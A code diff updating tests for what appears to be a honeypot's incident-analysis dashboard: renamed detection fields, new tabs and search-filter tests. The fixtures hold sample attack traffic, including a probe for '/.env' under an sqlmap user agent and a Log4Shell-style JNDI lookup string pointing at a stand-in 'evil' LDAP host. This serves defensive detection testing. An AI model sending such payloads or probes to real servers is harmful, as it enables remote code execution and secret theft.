@@ -77,7 +77,7 @@ function incident(overrides: Partial<Incident> = {}): Incident {
     method: "GET",
     path: "/.env",
     headers: { "user-agent": "sqlmap/1.7" },
-    detections: [{ detectorId: "decoy-path", reason: "decoy", score: 10 }],
+    detections: [{ detector: "decoy-path", summary: "decoy", score: 10 }],
     score: 10,
     totalScore: 10,
     respondedWith: "decoy-content",
@@ -176,7 +176,7 @@ describe("analysis", () => {
 
   it("classifies protocols, user agents and responses", () => {
     expect(protoOf(incident())).toBe("http");
-    expect(protoOf(incident({ detections: [{ detectorId: "ssh-auth-bruteforce", reason: "", score: 1 }] }))).toBe("ssh");
+    expect(protoOf(incident({ detections: [{ detector: "ssh-auth-bruteforce", summary: "", score: 1 }] }))).toBe("ssh");
     expect(uaOf(incident({ headers: {} }))).toBe("(none)");
     expect(uaOf(incident({ headers: { "user-agent": ["curl/8", "x"] } }))).toBe("curl/8");
     expect(rung("block")).toBe(3);
@@ -203,9 +203,9 @@ describe("analysis", () => {
   it("analyzes a corpus: counts, co-occurrence, gaps, buckets", () => {
     const base = Date.UTC(2026, 0, 1, 12, 0, 0);
     const list = [
-      incident({ ip: "1.1.1.1", timestamp: new Date(base).toISOString(), detections: [{ detectorId: "a", reason: "", score: 5 }, { detectorId: "b", reason: "", score: 5 }], score: 10, totalScore: 10, fingerprint: "fp1" }),
-      incident({ ip: "1.1.1.1", timestamp: new Date(base + 1000).toISOString(), detections: [{ detectorId: "a", reason: "", score: 5 }], score: 5, totalScore: 15, respondedWith: "block", fingerprint: "fp1" }),
-      incident({ ip: "2.2.2.2", timestamp: new Date(base + 3000).toISOString(), detections: [{ detectorId: "b", reason: "", score: 2 }], score: 2, totalScore: 2, fingerprint: "fp1", body: "x=1" }),
+      incident({ ip: "1.1.1.1", timestamp: new Date(base).toISOString(), detections: [{ detector: "a", summary: "", score: 5 }, { detector: "b", summary: "", score: 5 }], score: 10, totalScore: 10, fingerprint: "fp1" }),
+      incident({ ip: "1.1.1.1", timestamp: new Date(base + 1000).toISOString(), detections: [{ detector: "a", summary: "", score: 5 }], score: 5, totalScore: 15, respondedWith: "block", fingerprint: "fp1" }),
+      incident({ ip: "2.2.2.2", timestamp: new Date(base + 3000).toISOString(), detections: [{ detector: "b", summary: "", score: 2 }], score: 2, totalScore: 2, fingerprint: "fp1", body: "x=1" }),
       // Unparseable time: cannot be placed on a chart, so it is not counted.
       incident({ timestamp: "garbage" }),
     ];
@@ -249,7 +249,7 @@ describe("analysis", () => {
     const base = Date.UTC(2026, 0, 1);
     const old = incident({ timestamp: new Date(base).toISOString() });
     const recent = incident({ timestamp: new Date(base + 3_600_000).toISOString() });
-    const ssh = incident({ timestamp: new Date(base + 3_600_001).toISOString(), detections: [{ detectorId: "ssh-scan", reason: "", score: 1 }] });
+    const ssh = incident({ timestamp: new Date(base + 3_600_001).toISOString(), detections: [{ detector: "ssh-scan", summary: "", score: 1 }] });
     expect(scopeIncidents([recent, old, ssh], 60_000, "").map((i) => i.id)).toEqual([recent.id, ssh.id]);
     expect(scopeIncidents([recent, old, ssh], 0, "http").map((i) => i.id)).toEqual([old.id, recent.id]);
   });
@@ -291,7 +291,7 @@ describe("decode", () => {
         path: `/login?user=${payload}&x=1`,
         headers: { "x-data": Buffer.from("${jndi:ldap://evil/a}").toString("base64") },
         body: `a=${payload}`,
-        detections: [{ detectorId: "payload-injection", reason: "", score: 1, metadata: { sample: payload, ips: ["1.2.3.4"] } }],
+        detections: [{ detector: "payload-injection", summary: "", score: 1, metadata: { sample: payload, ips: ["1.2.3.4"] } }],
       }),
     );
     // The body is read whole and as form pairs, which decode to different text.
@@ -303,7 +303,7 @@ describe("decode", () => {
 
   it("ignores inherited metadata keys", () => {
     const metadata = Object.create({ sample: encodeURIComponent("inherited <payload>") }) as Record<string, unknown>;
-    expect(decodeCandidates(incident({ path: "/", headers: {}, detections: [{ detectorId: "x", reason: "", score: 1, metadata }] }))).toEqual([]);
+    expect(decodeCandidates(incident({ path: "/", headers: {}, detections: [{ detector: "x", summary: "", score: 1, metadata }] }))).toEqual([]);
   });
 });
 
@@ -311,7 +311,10 @@ describe("query", () => {
   const sections = { overview: true, incidents: false, statistics: true, sessions: false, actors: true, intel: true };
 
   it("lists and resolves tabs from sections and the hash", () => {
-    expect(availableTabs(sections)).toEqual(["overview", "statistics", "actors", "intel"]);
+    // Reference explains the library rather than this deployment, so it is there whatever the
+    // sections say; Policy is there only where a policy control was granted.
+    expect(availableTabs(sections)).toEqual(["overview", "statistics", "actors", "intel", "reference"]);
+    expect(availableTabs(sections, true)).toEqual(["overview", "statistics", "actors", "intel", "policy", "reference"]);
     const available = availableTabs(sections);
     expect(tabFromHash("#actors", available)).toBe("actors");
     expect(tabFromHash("#stats", available)).toBe("statistics");
@@ -320,12 +323,16 @@ describe("query", () => {
   });
 
   it("builds incident queries and matches live incidents the same way", () => {
-    expect(incidentQuery({ limit: 5000, detector: " decoy-path ", ip: "" })).toBe("limit=1000&detector=decoy-path");
-    expect(incidentQuery({ limit: Number.NaN, detector: "", ip: "1.2.3.4" })).toBe("limit=100&ip=1.2.3.4");
+    expect(incidentQuery({ limit: 5000, detector: " decoy-path ", ip: "", query: "" })).toBe("limit=1000&detector=decoy-path");
+    expect(incidentQuery({ limit: Number.NaN, detector: "", ip: "1.2.3.4", query: "" })).toBe("limit=100&ip=1.2.3.4");
     const hit = incident();
-    expect(matchesFilter(hit, { limit: 1, detector: "decoy-path", ip: "203.0.113.1" })).toBe(true);
-    expect(matchesFilter(hit, { limit: 1, detector: "other", ip: "" })).toBe(false);
-    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "9.9.9.9" })).toBe(false);
+    expect(matchesFilter(hit, { limit: 1, detector: "decoy-path", ip: "203.0.113.1", query: "" })).toBe(true);
+    expect(matchesFilter(hit, { limit: 1, detector: "other", ip: "", query: "" })).toBe(false);
+    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "9.9.9.9", query: "" })).toBe(false);
+    // The search box is judged the same way for a streamed incident as for a fetched one.
+    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "", query: "ip:203.0.113.1 -path:/admin" })).toBe(true);
+    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "", query: "ip:203.0.113.10" })).toBe(false);
+    expect(matchesFilter(hit, { limit: 1, detector: "", ip: "", query: "outcome:decoy" })).toBe(true);
   });
 
   it("validates stream frames", () => {
